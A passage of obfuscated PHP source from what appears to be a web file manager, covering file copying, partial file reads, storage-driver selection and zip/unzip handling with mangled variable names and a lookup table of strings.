array_to_keyvalue(self::listAllSimple($³šÖçÙ»), $ÁÖ·ê«Ö[97]); $ÉÏ³Ÿä = array(); $¯†Ÿîó = array(); foreach ($ËŠü±ÓĞ as $‚‚ú¾ºÙ => $×«’¬›÷) { if (isset($Ö‡°äî[$‚‚ú¾ºÙ])) { if ($×«’¬›÷[$ÁÖ·ê«Ö[88]] == 1) { continue; } if ($Ö‡°äî[$‚‚ú¾ºÙ][$ÁÖ·ê«Ö[89]] == $×«’¬›÷[$ÁÖ·ê«Ö[89]]) { continue; } } if ($×«’¬›÷[$ÁÖ·ê«Ö[88]] == 1) { $¯†Ÿîó[] = $³šÖçÙ» . $ÁÖ·ê«Ö[8] . trim($‚‚ú¾ºÙ, $ÁÖ·ê«Ö[8]); continue; } $”Ş±´òÂ = strstr(trim($‚‚ú¾ºÙ, $ÁÖ·ê«Ö[8]), $ÁÖ·ê«Ö[8]) ? get_path_father($‚‚ú¾ºÙ) : $ÁÖ·ê«Ö[12]; $ÉÏ³Ÿä[] = array($ÁÖ·ê«Ö[1216] => $×«’¬›÷[$ÁÖ·ê«Ö[99]], $ÁÖ·ê«Ö[1217] => rtrim($³šÖçÙ», $ÁÖ·ê«Ö[8]) . $ÁÖ·ê«Ö[8] . $”Ş±´òÂ, $ÁÖ·ê«Ö[1218] => $×«’¬›÷); } $ÀÕÅ¨ü» = array($ÁÖ·ê«Ö[240] => $ÉÏ³Ÿä, $ÁÖ·ê«Ö[88] => $¯†Ÿîó); Hook::trigger($ÁÖ·ê«Ö[1219], $üÛèºŞÕ, $³šÖçÙ», $ÀÕÅ¨ü»); foreach ($¯†Ÿîó as $×«’¬›÷) { IO::mkdir($×«’¬›÷); } foreach ($ÉÏ³Ÿä as $×«’¬›÷) { IO::copy($×«’¬›÷[$ÁÖ·ê«Ö[1216]], $×«’¬›÷[$ÁÖ·ê«Ö[1217]], REPEAT_REPLACE); } } public static function fileSubstr($ÑÕµïÀ, $¸­°Û½, $¨ÒªŒÛ = false) { $½ˆœ°«ô =& $_SERVER[è¶³ÒßÑ]; $§ıÂµÑ‚ = self::driverMake($ÑÕµïÀ); $â§ü¿” = $§ıÂµÑ‚->size($ÑÕµïÀ); $¾Æ‡ä»§ = $¸­°Û½; $Ôä®«Ûˆ = $¨ÒªŒÛ; if ($¸­°Û½ < 0) { $¸­°Û½ = $â§ü¿” + $¸­°Û½; } if ($¨ÒªŒÛ === !1) { $¨ÒªŒÛ = $â§ü¿” - $¸­°Û½; } if ($¸­°Û½ + $¨ÒªŒÛ > $â§ü¿”) { $¨ÒªŒÛ = $â§ü¿” - $¸­°Û½; } if (!$â§ü¿” && $§ıÂµÑ‚->getType() == $½ˆœ°«ô[119] && !$§ıÂµÑ‚->exist($ÑÕµïÀ)) { $óğÈÛƒ– = get_path_this($ÑÕµïÀ); $•ËïÃ£Í = parse_url_query($óğÈÛƒ–); if (is_array($•ËïÃ£Í) && isset($•ËïÃ£Í[$½ˆœ°«ô[32]])) { $óğÈÛƒ– = urldecode($•ËïÃ£Í[$½ˆœ°«ô[32]]); } throw new Exception($½ˆœ°«ô[1220] . LNG($½ˆœ°«ô[1221]) . $½ˆœ°«ô[1019] . clear_html($óğÈÛƒ–) . $½ˆœ°«ô[12]); } if ($¨ÒªŒÛ <= 0) { return $½ˆœ°«ô[12]; } if ($¸­°Û½ < 0 || $¸­°Û½ >= $â§ü¿” || $¨ÒªŒÛ > 1024 * 1024 * 10) { throw new Exception("\x66\x69\154\x65\122\145\x61\144\40\x65\x72\x72\157\x72\x21\40\163\x74\x61\162\164\x3d{$¸­°Û½}\x3b\154\145\156\x67\164\x68\x3d{$¨ÒªŒÛ}\x3b\40\163\151\x7a\x65\75{$â§ü¿”}\73"); } $Í½‚½´¢ = $§ıÂµÑ‚->fileSubstr($ÑÕµïÀ, $¸­°Û½, $¨ÒªŒÛ); if (!$Í½‚½´¢ && $¨ÒªŒÛ && isset($GLOBALS[$½ˆœ°«ô[1222]])) { throw new Exception($GLOBALS[$½ˆœ°«ô[1222]][$½ˆœ°«ô[1223]]); } return $Í½‚½´¢; } private static function driverMake(&$ôšÍğÈ) { $úÇÓ±ş¬ =& $_SERVER[è¶³ÒßÑ]; $Îãº ö² = KodIO::parse($ôšÍğÈ); if (!self::$driverListSystem) { $³ş¡ä¦Á = Model($úÇÓ±ş¬[821])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($³ş¡ä¦Á, $úÇÓ±ş¬[468]); } if ($Îãº ö²[$úÇÓ±ş¬[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Îãº ö²[$úÇÓ±ş¬[468]]]) { throw new Exception($úÇÓ±ş¬[1224]); return !1; } $ôšÍğÈ = $Îãº ö²[$úÇÓ±ş¬[1225]]; $çÑ‹Ç³ = self::driverGet($Îãº ö², $ôšÍğÈ); return $çÑ‹Ç³; } private static function driverGet($öå Ù±, &$Ç¡¦’Üë) { $§ßÛ·©¾ =& $_SERVER[è¶³ÒßÑ]; $ıÖÕ¼¾° = $öå Ù±[$§ßÛ·©¾[1226]]; $³óõŸî = $öå Ù±[$§ßÛ·©¾[468]]; switch ($öå Ù±[$§ßÛ·©¾[33]]) { case KodIO::KOD_IO: $ùÜÕ®ç£ = self::$driverListSystem[$³óõŸî]; break; case KodIO::KOD_SOURCE: $Ç¡¦’Üë = $³óõŸî . $Ç¡¦’Üë; $ùÜÕ®ç£ = array($§ßÛ·©¾[1227] => $§ßÛ·©¾[1228], $§ßÛ·©¾[6] => $öå Ù±); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $·êğ¿‰« = $GLOBALS[$§ßÛ·©¾[1229]]; self::$driverListUser = array_to_keyvalue($·êğ¿‰«, $§ßÛ·©¾[468]); } $ùÜÕ®ç£ = self::$driverListUser[$³óõŸî]; break; case KodIO::KOD_SHARE_LINK: $ùÜÕ®ç£ = array($§ßÛ·©¾[1227] => $§ßÛ·©¾[1230], $§ßÛ·©¾[6] => $öå Ù±); $ÈñìÒæº = Action($§ßÛ·©¾[1231])->sharePathInfo($öå Ù±[$§ßÛ·©¾[97]]); $Ç¡¦’Üë = $ÈñìÒæº[$§ßÛ·©¾[203]]; if (!$ÈñìÒæº[$§ßÛ·©¾[203]]) { $½¿ĞÇÉœ = Model($§ßÛ·©¾[657])->getInfo($ÈñìÒæº[$§ßÛ·©¾[658]]); $Ç¡¦’Üë = KodIO::clear($½¿ĞÇÉœ[$§ßÛ·©¾[1232]] . $öå Ù±[$§ßÛ·©¾[1225]]); $öå Ù±[$§ßÛ·©¾[553]] = $½¿ĞÇÉœ; $öå Ù±[$§ßÛ·©¾[1207]] = $Ç¡¦’Üë; $ùÜÕ®ç£ = array($§ßÛ·©¾[1227] => $§ßÛ·©¾[1233], $§ßÛ·©¾[6] => $öå Ù±); } break; case KodIO::KOD_SHARE_ITEM: $ùÜÕ®ç£ = array($§ßÛ·©¾[1227] => $§ßÛ·©¾[1234], $§ßÛ·©¾[6] => $öå Ù±); $½¿ĞÇÉœ = Model($§ßÛ·©¾[657])->getInfo($öå Ù±[$§ßÛ·©¾[468]]); if ($½¿ĞÇÉœ[$§ßÛ·©¾[203]] == $§ßÛ·©¾[238]) { $Ç¡¦’Üë = KodIO::clear($½¿ĞÇÉœ[$§ßÛ·©¾[1232]] . $öå Ù±[$§ßÛ·©¾[1225]]); $öå Ù±[$§ßÛ·©¾[553]] = $½¿ĞÇÉœ; $öå Ù±[$§ßÛ·©¾[1207]] = $Ç¡¦’Üë; $ùÜÕ®ç£ = array($§ßÛ·©¾[1227] => $§ßÛ·©¾[1235], $§ßÛ·©¾[6] => $öå Ù±); } else { if (!$Ç¡¦’Üë) { $Ç¡¦’Üë = $½¿ĞÇÉœ[$§ßÛ·©¾[203]]; } } break; default: $Ç¡¦’Üë = $öå Ù±[$§ßÛ·©¾[97]]; $ùÜÕ®ç£ = array($§ßÛ·©¾[1227] => $§ßÛ·©¾[1236]); break; } $íÑŸ›úÍ = $öå Ù±[$§ßÛ·©¾[97]]; if (!isset(self::$driverCache[$íÑŸ›úÍ])) { $Ò€íš…à = strtolower($ùÜÕ®ç£[$§ßÛ·©¾[108]]); $Êç¦ùÂÖ = $GLOBALS[$§ßÛ·©¾[6]][$§ßÛ·©¾[102]][$§ßÛ·©¾[879]]; $ŸÍ¯Ç‚Ù = $§ßÛ·©¾[87] . (isset($Êç¦ùÂÖ[$Ò€íš…à]) ? $Êç¦ùÂÖ[$Ò€íš…à] : ucfirst($Ò€íš…à)); if (!class_exists($ŸÍ¯Ç‚Ù)) { show_json("{$ŸÍ¯Ç‚Ù}\40\x6e\157\x74\x20\145\x78\151\x73\164\163\41", !1); } $ç€äº¨ê = isset($ùÜÕ®ç£[$§ßÛ·©¾[6]]) ? $ùÜÕ®ç£[$§ßÛ·©¾[6]] : !1; self::$driverCache[$íÑŸ›úÍ] = new $ŸÍ¯Ç‚Ù($ç€äº¨ê); } $©‡¾é¨Š = self::$driverCache[$íÑŸ›úÍ]; $©‡¾é¨Š->pathDriver = $ıÖÕ¼¾°; $©‡¾é¨Š->pathBase = $§ßÛ·©¾[12]; if (isset($ùÜÕ®ç£[$§ßÛ·©¾[6]][$§ßÛ·©¾[1237]])) { $©‡¾é¨Š->pathBase = rtrim($ùÜÕ®ç£[$§ßÛ·©¾[6]][$§ßÛ·©¾[1237]], $§ßÛ·©¾[8]) . $§ßÛ·©¾[8]; $Ç¡¦’Üë = $©‡¾é¨Š->pathBase . ltrim($Ç¡¦’Üë, $§ßÛ·©¾[8]); } $Ç¡¦’Üë = $©‡¾é¨Š->getPath($Ç¡¦’Üë); if (isset($öå Ù±[$§ßÛ·©¾[1207]])) { $Ç¡¦’Üë = $öå Ù±[$§ßÛ·©¾[1207]]; } $©‡¾é¨Š->path = $Ç¡¦’Üë; return $©‡¾é¨Š; } public static function errorTips($Âº±Ú‹µ = false) { $¦«¸¸÷» =& $_SERVER[è¶³ÒßÑ]; static $Àíç“‰ = array(); $¾•­×™µ = 1000; if ($Âº±Ú‹µ === -1) { return $Àíç“‰ ? $Àíç“‰[count($Àíç“‰) - 1] : $¦«¸¸÷»[12]; } if ($Âº±Ú‹µ === !1) { return implode($¦«¸¸÷»[60], $Àíç“‰); } if (count($Àíç“‰) >= $¾•­×™µ) { $Àíç“‰ = array_slice($Àíç“‰, $¾•­×™µ * 0.5, $¾•­×™µ); } $Àíç“‰[] = $Âº±Ú‹µ; write_log($¦«¸¸÷»[186] . ACTION . $¦«¸¸÷»[1238] . $Âº±Ú‹µ, $¦«¸¸÷»[1239]); } public static function getLastError($ùòÂãã© = '') { $Œ°†€×Ú = self::errorTips(-1); return $Œ°†€×Ú ? $Œ°†€×Ú : $ùòÂãã©; } } goto e¬§çÎªÍ­; e¬§çÎªÍ­: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ì´ü—Øì; if ($Ì´ü—Øì) { return $Ì´ü—Øì; } $Ç»·ÅüÒ = IO::init($_SERVER[è¶³ÒßÑ][8]); return $Ç»·ÅüÒ; } private static function iconvSystem($Õ€ÍÔö) { return self::local()->iconvSystem($Õ€ÍÔö); } private static function iconvApp($äË ’Ÿ) { return self::local()->iconvApp($äË ’Ÿ); } public static function zipFolder($ªäö©¬´, $ïÃ”²ş = "\x7a\151\160", $õİã¯¾ù = '', $Éè€úÕ = REPEAT_RENAME) { $ã­Ë­¥¤ =& $_SERVER[è¶³ÒßÑ]; $ƒ¤¥Ç§ = IO::listPath($ªäö©¬´); if (!$ƒ¤¥Ç§) { return !1; } $ƒ¤¥Ç§ = array_merge($ƒ¤¥Ç§[$ã­Ë­¥¤[95]], $ƒ¤¥Ç§[$ã­Ë­¥¤[96]]); return self::zip($ƒ¤¥Ç§, $ïÃ”²ş, $õİã¯¾ù, $Éè€úÕ); } public static function zip($Ê‚‹Ú, $Ê¨™³¼ = "\x7a\151\160", $ùÆñ—ï’ = '', $ĞÃëŒÃ = REPEAT_RENAME) { $¶¯Šñ’ß =& $_SERVER[è¶³ÒßÑ]; if (is_string($Ê‚‹Ú) && $Ê‚‹Ú) { $Ê‚‹Ú = array(array($¶¯Šñ’ß[97] => $Ê‚‹Ú)); } $™¥°ÆÅç = self::init($Ê‚‹Ú[0][$¶¯Šñ’ß[97]]); $ó¢ùÏ½é = self::info($Ê‚‹Ú[0][$¶¯Šñ’ß[97]]); $ÂÜé«– = $¶¯Šñ’ß[12]; $ùßã£†Æ = $¶¯Šñ’ß[12]; $ÕÆìÊ¹à = $¶¯Šñ’ß[12]; if ($ùÆñ—ï’ && substr($ùÆñ—ï’, -1, 1) != $¶¯Šñ’ß[8]) { $ùßã£†Æ = get_path_father($ùÆñ—ï’); $ÕÆìÊ¹à = get_path_this($ùÆñ—ï’); } else { $ùßã£†Æ = self::pathFather($ó¢ùÏ½é[$¶¯Šñ’ß[97]]); $ÕÆìÊ¹à = $ó¢ùÏ½é[$¶¯Šñ’ß[32]] . $¶¯Šñ’ß[10] . $Ê¨™³¼; if (count($Ê‚‹Ú) > 1) { $‘÷ï¾Ü¨ = IO::info($ùßã£†Æ); $ÕÆìÊ¹à = $‘÷ï¾Ü¨[$¶¯Šñ’ß[32]] . $¶¯Šñ’ß[10] . $Ê¨™³¼; } if ($ùÆñ—ï’) { $ùßã£†Æ = $ùÆñ—ï’; } } if ($™¥°ÆÅç->getType() == $¶¯Šñ’ß[119]) { $¿çˆœ• = self::init($ùßã£†Æ); $¥ªŸÎƒ = $¿çˆœ•->getType() == $¶¯Šñ’ß[119] ? $ùßã£†Æ : get_path_father($™¥°ÆÅç->path); $¥ªŸÎƒ = rtrim($¥ªŸÎƒ, $¶¯Šñ’ß[8]) . $¶¯Šñ’ß[8]; mk_dir($¥ªŸÎƒ); } else { $ÂÜé«– = TEMP_FILES . $¶¯Šñ’ß[1240] . time() . rand_string(8) . $¶¯Šñ’ß[8]; mk_dir($ÂÜé«–); file_put_contents($ÂÜé«– . $¶¯Šñ’ß[1241], $¶¯Šñ’ß[12]); $¥ªŸÎƒ = $ÂÜé«–; } $”¢ŸÎ æ = IO::info($¥ªŸÎƒ); if (!$”¢ŸÎ æ || !$”¢ŸÎ æ[$¶¯Šñ’ß[243]]) { show_json(LNG($¶¯Šñ’ß[1242]), !1); } $¸ à«Œ = self::zipFileList($Ê‚‹Ú, $ÂÜé«–); foreach ($¸ à«Œ as $é˜Òù« => $€ğ›Ş¿Ö) { $¸ à«Œ[$é˜Òù«] = self::iconvSystem($€ğ›Ş¿Ö); } $Î‰…íë = get_filename_auto($¥ªŸÎƒ . $ÕÆìÊ¹à, $¶¯Šñ’ß[12], $ĞÃëŒÃ); KodArchive::create(self::iconvSystem($Î‰…íë), $¸ à«Œ); if (!IO::exist($Î‰…íë)) { if ($ÂÜé«–) { del_dir($ÂÜé«–); } write_log($¶¯Šñ’ß[1243] . $Î‰…íë, $¶¯Šñ’ß[382]); show_json(LNG($¶¯Šñ’ß[1244]), !1); } if (!$ÂÜé«–) { return $Î‰…íë; } $è„ÁÅ…€ = self::move($Î‰…íë, $ùßã£†Æ, $ĞÃëŒÃ); if ($ÂÜé«–) { del_dir($ÂÜé«–); } if (!$Î‰…íë) { write_log($¶¯Šñ’ß[1245] . $Î‰…íë . $¶¯Šñ’ß[1246] . $ùßã£†Æ, $¶¯Šñ’ß[382]); show_json(LNG($¶¯Šñ’ß[1244]), !1); } return $è„ÁÅ…€; } public static function unzip($Š•äÙ›³, $òÍÎ‘‹Æ, $ŸóæÛàÕ = "\x2d\x31", $äãŠı×ä = "\x72\x65\160\154\141\x63\x65") { $‚ÇƒÂÂ =& $_SERVER[è¶³ÒßÑ]; $ì¹ß•Õ™ = parent::info($Š•äÙ›³); if (!$ì¹ß•Õ™) { show_json(LNG($‚ÇƒÂÂ[1247]), !1); } $ÑÈÓ…í = IO::infoFullSimple($òÍÎ‘‹Æ); if (!$ÑÈÓ…í) { $òÍÎ‘‹Æ = IO::mkdir($òÍÎ‘‹Æ); } if (isset($ÑÈÓ…í[$‚ÇƒÂÂ[203]]) && trim($ÑÈÓ…í[$‚ÇƒÂÂ[97]], $‚ÇƒÂÂ[8]) != trim($òÍÎ‘‹Æ, $‚ÇƒÂÂ[8])) { $³‚´Öåá = KodIO::make($ÑÈÓ…í[$‚ÇƒÂÂ[202]]); $Á¹ø¸¼ß = IO::fileNameAuto($³‚´Öåá, $ÑÈÓ…í[$‚ÇƒÂÂ[32]], REPEAT_RENAME_FOLDER, !0); $òÍÎ‘‹Æ = IO::mkdir($³‚´Öåá . $Á¹ø¸¼ß); } $ŸóæÛàÕ = $ŸóæÛàÕ && $ŸóæÛàÕ != $‚ÇƒÂÂ[1248] ? @json_decode($ŸóæÛàÕ, !0) : -1; $³ëÓô–á = self::unzipPart($Š•äÙ›³, $ŸóæÛàÕ); if (!$³ëÓô–á || !IO::exist($³ëÓô–á[$‚ÇƒÂÂ[240]])) { show_json(LNG($‚ÇƒÂÂ[118]), !1); } $œÎ¯ÚĞš = $³ëÓô–á[$‚ÇƒÂÂ[1249]][count($³ëÓô–á[$‚ÇƒÂÂ[1249]]) - 1]; if ($œÎ¯ÚĞš[$‚ÇƒÂÂ[1250]] == -1 || substr($œÎ¯ÚĞš[$‚ÇƒÂÂ[32]], -1, 1) == $‚ÇƒÂÂ[8]) { $©ÒÕùŠÍ = $³ëÓô–á[$‚ÇƒÂÂ[1251]] . rand_string(10) . $‚ÇƒÂÂ[8]; mk_dir($©ÒÕùŠÍ); $Í¨ùåİĞ = count($³ëÓô–á[$‚ÇƒÂÂ[1249]]) == 1 ? IO::ext($Š•äÙ›³) : get_path_ext($³ëÓô–á[$‚ÇƒÂÂ[240]]); $àòõ”©³ = KodArchive::extract(self::iconvSystem($³ëÓô–á[$‚ÇƒÂÂ[240]]), $©ÒÕùŠÍ, $œÎ¯ÚĞš[$‚ÇƒÂÂ[1250]], $Á¹ø¸¼ß, $Í¨ùåİĞ); self::unzipErrorCheck($àòõ”©³, array($‚ÇƒÂÂ[1252], $Š•äÙ›³, $Í¨ùåİĞ, $òÍÎ‘‹Æ, $³ëÓô–á)); Hook::trigger($‚ÇƒÂÂ[1253], $©ÒÕùŠÍ); recursion_dir($©ÒÕùŠÍ, $àËŠşã, $¶µéÁÚ², 0); $¯á†¾œœ = array_merge($àËŠşã, $¶µéÁÚ²); $„¨»ÍÂ¦ = array(); foreach ($¯á†¾œœ as $‚˜ èáò) { $Ò ˆÒèå = IO::move(self::iconvApp($‚˜ èáò), $òÍÎ‘‹Æ, $äãŠı×ä); if ($Ò ˆÒèå) { $„¨»ÍÂ¦[] = $Ò ˆÒèå; } } del_dir($©ÒÕùŠÍ); } else { $Ò ˆÒèå = IO::move($³ëÓô–á[$‚ÇƒÂÂ[240]], $òÍÎ‘‹Æ, $äãŠı×ä, get_path_this($œÎ¯ÚĞš[$‚ÇƒÂÂ[32]])); if ($Ò ˆÒèå) { $„¨»ÍÂ¦[] = $Ò ˆÒèå; } } return $„¨»ÍÂ¦ ? $„¨»ÍÂ¦ : !1; } public static function unzipList($‚ê“æåÊ) { $Ÿªû¤¾¥ =& $_SERVER[è¶³ÒßÑ]; $à›Äï† = isset($‚ê“æåÊ[$Ÿªû¤¾¥[1254]]) ? $‚ê“æåÊ[$Ÿªû¤¾¥[1254]] : !1; $öËûöÖ = isset($‚ê“æåÊ[$Ÿªû¤¾¥[1250]]) ? @json_decode($‚ê“æåÊ[$Ÿªû¤¾¥[1250]], !0) : -1; $‘”¼«“Í = self::unzipPart($‚ê“æåÊ[$Ÿªû¤¾¥[97]], $öËûöÖ); if (!$‘”¼«“Í || !IO::exist($‘”¼«“Í[$Ÿªû¤¾¥[240]])) { show_json(LNG($Ÿªû¤¾¥[118]), !1); } $Ì…ßğ˜ö = $‘”¼«“Í[$Ÿªû¤¾¥[1249]][count($‘”¼«“Í[$Ÿªû¤¾¥[1249]]) - 1]; $ÆÀÑæ³– = in_array(IO::ext($‘”¼«“Í[$Ÿªû¤¾¥[240]]), array($Ÿªû¤¾¥[382], $Ÿªû¤¾¥[1255], $Ÿªû¤¾¥[1256], $Ÿªû¤¾¥[1257], $Ÿªû¤¾¥[1258], $Ÿªû¤¾¥[1259])); if (!$à›Äï† && ($Ì…ßğ˜ö[$Ÿªû¤¾¥[1250]] == -1 || $ÆÀÑæ³–)) { $õı‡äÄğ = $‘”¼«“Í[$Ÿªû¤¾¥[1251]] . get_path_this($‘”¼«“Í[$Ÿªû¤¾¥[240]]) . $Ÿªû¤¾¥[1260]; if (!IO::exist($õı‡äÄğ)) { $İŠóùÛ” = $Ì…ßğ˜ö[$Ÿªû¤¾¥[1250]] == -1 ? get_path_ext(IO::pathThis($‚ê“æåÊ[$Ÿªû¤¾¥[97]])) : get_path_ext($‘”¼«“Í[$Ÿªû¤¾¥[240]]); $‡¯¡ä„ = KodArchive::listContent(self::iconvSystem($‘”¼«“Í[$Ÿªû¤¾¥[240]]), !0, $İŠóùÛ”); self::unzipErrorCheck($‡¯¡ä„, array($Ÿªû¤¾¥[1261], $‚ê“æåÊ, $‘”¼«“Í)); @file_put_contents($õı‡äÄğ, json_encode($‡¯¡ä„[$Ÿªû¤¾¥[1262]])); } return @json_decode(IO::getContent($õı‡äÄğ), !0); } IO::fileOut($‘”¼«“Í[$Ÿªû¤¾¥[240]], $à›Äï†, get_path_this($Ì…ßğ˜ö[$Ÿªû¤¾¥[32]])); die; } private static function zipFileList($ŒÉÏ¹‹¨, $Æº£†§œ = false) { $Õâ˜ÕÄ¸ =& $_SERVER[è¶³ÒßÑ]; $ÉƒÆÑè÷ = array(); foreach ($ŒÉÏ¹‹¨ as $¶ö½¼—«) { $É‰ƒòçÌ = $¶ö½¼—«[$Õâ˜ÕÄ¸[97]]; if ($Æº£†§œ) { $É‰ƒòçÌ = self::copy($¶ö½¼—«[$Õâ˜ÕÄ¸[97]], $Æº£†§œ, $Õâ˜ÕÄ¸[872]); } else { $ÅÚÇŠê» = self::init($¶ö½¼—«[$Õâ˜ÕÄ¸[97]]); if ($ÅÚÇŠê»->getType() == $Õâ˜ÕÄ¸[119]) { $É‰ƒòçÌ = $ÅÚÇŠê»->path; } } if ($É‰ƒòçÌ && self::local()->exist($É‰ƒòçÌ)) { $ÉƒÆÑè÷[$¶ö½¼—«[$Õâ˜ÕÄ¸[97]]] = $É‰ƒòçÌ; } } if (!empty($ÉƒÆÑè÷)) { return array_values($ÉƒÆÑè÷); } show_json(LNG($Õâ˜ÕÄ¸[1221]), !1); } private static function localFilePath($ò³–‘ó­) { $—ÈÊ¼‹» =& $_SERVER[è¶³ÒßÑ]; $ÔŒö¬­  = KodIO::parse($ò³–‘ó­); if ($ÔŒö¬­ [$—ÈÊ¼‹»[33]] == KodIO::KOD_SOURCE) { $ŒóÒİüñ = Model($—ÈÊ¼‹»[878])->fileInfoGet(KodIO::sourceID($ò³–‘ó­)); if (!$ŒóÒİüñ[$—ÈÊ¼‹»[97]]) { show_json($—ÈÊ¼‹»[1263], !1); } $ò³–‘ó­ = $ŒóÒİüñ[$—ÈÊ¼‹»[97]]; } $”Ïıå¹ó = self::init($ò³–‘ó­); if ($”Ïıå¹ó->pathParse[$—ÈÊ¼‹»[1207]]) { $ò³–‘ó­ = $”Ïıå¹ó->pathParse[$—ÈÊ¼‹»[1207]]; $”Ïıå¹ó = self::init($ò³–‘ó­); } $¾¶ê“ú = $”Ïıå¹ó->getType(); if ($¾¶ê“ú == $—ÈÊ¼‹»[119] || $¾¶ê“ú == $—ÈÊ¼‹»[1264]) { if (!$”Ïıå¹ó->exist($”Ïıå¹ó->path)) { show_json(LNG($—ÈÊ¼‹»[118]), !1); } return $”Ïıå¹ó->path; } return !1; } public static function unzipPart($ğÍœÈ“ß, $ ŒÂìÊÆ = -1) { $ğĞÏÈß« =& $_SERVER[è¶³ÒßÑ]; $€Ó¢Ë» = IO::pathThis($ğÍœÈ“ß); if (!$ ŒÂìÊÆ || $ ŒÂìÊÆ == -1) { $“¼‚ã = array(array($ğĞÏÈß«[32] => $€Ó¢Ë», $ğĞÏÈß«[1250] => -1)); $“¼‚ã[0][$ğĞÏÈß«[1265]] = $“¼‚ã[0][$ğĞÏÈß«[32]]; } else { if (is_array($ ŒÂìÊÆ)) { $“¼‚ã = $ ŒÂìÊÆ; $Øêí¸Ë = count($“¼‚ã) - 1; for ($áÌÌ¼ú = 0; $áÌÌ¼ú <= $Øêí¸Ë; $áÌÌ¼ú++) { $ß¹­õÓ» = $“¼‚ã[$áÌÌ¼ú]; $±ç¹Äˆƒ = get_path_this($ß¹­õÓ»[$ğĞÏÈß«[32]]) . (checkExtSafe($ß¹­õÓ»[$ğĞÏÈß«[32]]) ? $ğĞÏÈß«[12] : $ğĞÏÈß«[1266]); $“¼‚ã[$áÌÌ¼ú][$ğĞÏÈß«[1265]] = $ğĞÏÈß«[1267] . intval($ß¹­õÓ»[$ğĞÏÈß«[1250]]) . $ğĞÏÈß«[455] . $±ç¹Äˆƒ; if ($áÌÌ¼ú == 0) { continue; } $“¼‚ã[$áÌÌ¼ú][$ğĞÏÈß«[1265]] = $“¼‚ã[$áÌÌ¼ú - 1][$ğĞÏÈß«[1265]] . $ğĞÏÈß«[1268] . $“¼‚ã[$áÌÌ¼ú][$ğĞÏÈß«[1265]]; } } } if (!is_array($“¼‚ã) || count($“¼‚ã) == 0) { return !1; } $¨ôØÜ†Ñ = $“¼‚ã[count($“¼‚ã) - 1]; if (!IO::exist($ğÍœÈ“ß)) { return !1; } $Ôñ¶™¬ã = TEMP_FILES . $ğĞÏÈß«[1269] . kodIO::hashPathSafe($ğÍœÈ“ß) . $ğĞÏÈß«[8]; $°Ø®Ìôé = $Ôñ¶™¬ã . $¨ôØÜ†Ñ[$ğĞÏÈß«[1265]]; mk_dir($Ôñ¶™¬ã); file_put_contents(TEMP_FILES . $ğĞÏÈß«[1241], $ğĞÏÈß«[12]); if (IO::exist($°Ø®Ìôé)) { return array($ğĞÏÈß«[240] => $°Ø®Ìôé, $ğĞÏÈß«[1249] => $“¼‚ã, $ğĞÏÈß«[1251] => $Ôñ¶™¬ã); } $ÂğÃ‘ÌÒ = self::localFilePath($ğÍœÈ“ß); if (!$ÂğÃ‘ÌÒ) { $ÂğÃ‘ÌÒ = $Ôñ¶™¬ã . $ğĞÏÈß«[1270]; if (!IO::exist($ÂğÃ‘ÌÒ)) { self::copy($ğÍœÈ“ß, $Ôñ¶™¬ã, !1, get_path_this($ÂğÃ‘ÌÒ)); } } if (!$ÂğÃ‘ÌÒ || !IO::exist($ÂğÃ‘ÌÒ)) { return !1; } if ($¨ôØÜ†Ñ[$ğĞÏÈß«[1250]] == -1) { return array($ğĞÏÈß«[240] => $ÂğÃ‘ÌÒ, $ğĞÏÈß«[1249] => $“¼‚ã, $ğĞÏÈß«[1251] => $Ôñ¶™¬ã); } $º€Ã˜§æ = $ÂğÃ‘ÌÒ; foreach ($“¼‚ã as $áÌÌ¼ú => $ß¹­õÓ») { if (!$ß¹­õÓ» || $ß¹­õÓ»[$ğĞÏÈß«[1250]] == $ğĞÏÈß«[1248]) { break; } if (substr($ß¹­õÓ»[$ğĞÏÈß«[32]], -1, 1) == $ğĞÏÈß«[8]) { break; } $À´™çÌ€ = in_array(get_path_ext($ß¹­õÓ»[$ğĞÏÈß«[1265]]), array($ğĞÏÈß«[382], $ğĞÏÈß«[1255], $ğĞÏÈß«[1256], $ğĞÏÈß«[1257], $ğĞÏÈß«[1258], $ğĞÏÈß«[1259])); $Ñî¶­êë = $áÌÌ¼ú == count($“¼‚ã) - 1 && $À´™çÌ€; $ªîï¤Æ = $Ôñ¶™¬ã . $ß¹­õÓ»[$ğĞÏÈß«[1265]]; $İáÈ´ = $Ôñ¶™¬ã . get_path_this($ß¹­õÓ»[$ğĞÏÈß«[32]]); if (IO::exist($ªîï¤Æ)) { $º€Ã˜§æ = $ªîï¤Æ; continue; } $îÄø÷•Û = $áÌÌ¼ú == 0 ? get_path_ext($€Ó¢Ë») : get_path_ext($º€Ã˜§æ); $‚ç°¨å® = KodArchive::extract(self::iconvSystem($º€Ã˜§æ), $Ôñ¶™¬ã, $ß¹­õÓ»[$ğĞÏÈß«[1250]], $¼ÒƒğœÈ, $îÄø÷•Û); self::unzipErrorCheck($‚ç°¨å®, array($ğĞÏÈß«[1271], $ğÍœÈ“ß, $“¼‚ã, $ß¹­õÓ», $ªîï¤Æ)); if (IO::exist($İáÈ´)) { IO::rename($İáÈ´, get_path_this($ªîï¤Æ)); } $º€Ã˜§æ = $ªîï¤Æ; } $°Ø®Ìôé = $º€Ã˜§æ; return array($ğĞÏÈß«[240] => $º€Ã˜§æ, $ğĞÏÈß«[1249] => $“¼‚ã, $ğĞÏÈß«[1251] => $Ôñ¶™¬ã); } private static function unzipErrorCheck($¿Ú™˜†, $åÚÜÌÑ® = false) { $„¤×Ù¶ß =& $_SERVER[è¶³ÒßÑ]; if ($¿Ú™˜†[$„¤×Ù¶ß[1272]]) { return !0; } write_log(array($„¤×Ù¶ß[1273], $¿Ú™˜†, $åÚÜÌÑ®), $„¤×Ù¶ß[1274]); show_json($„¤×Ù¶ß[1275] . json_encode($¿Ú™˜†[$„¤×Ù¶ß[1262]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¯îöÓÆ =& $_SERVER[è¶³ÒßÑ]; $›˜²ù¸¹ = $GLOBALS[$¯îöÓÆ[6]][$¯îöÓÆ[102]]; if ($›˜²ù¸¹[$¯îöÓÆ[1276]] != 1) { return; } if ($›˜²ù¸¹[$¯îöÓÆ[1277]] <= 0) { return; } if (isset($_REQUEST[$¯îöÓÆ[1278]]) && $_REQUEST[$¯îöÓÆ[1278]] == $¯îöÓÆ[101]) { return; } 